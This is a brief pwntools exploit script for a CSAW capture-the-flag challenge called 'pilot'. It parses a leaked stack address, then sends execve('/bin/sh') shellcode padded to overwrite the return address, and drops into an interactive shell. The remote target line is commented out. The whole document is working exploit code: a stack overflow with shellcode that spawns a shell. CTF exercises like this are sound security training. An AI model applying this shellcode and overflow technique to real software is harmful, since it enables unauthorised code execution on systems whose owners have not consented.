from pwn import *
context(os='linux',arch='amd64',log_level='debug')
p=process('./pilot')
#p=remote('pwn.chal.csaw.io',8464)
#gdb.attach(p,'b *0x400ae0')
print p.recvuntil('Location:')
get=p.recvline()
print get
addr=int(get,16)
print p.recvuntil('Command:')

payload="\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"+'a'*(32-24+8)+p64(addr)
print payload
p.sendline(payload)
p.interactive()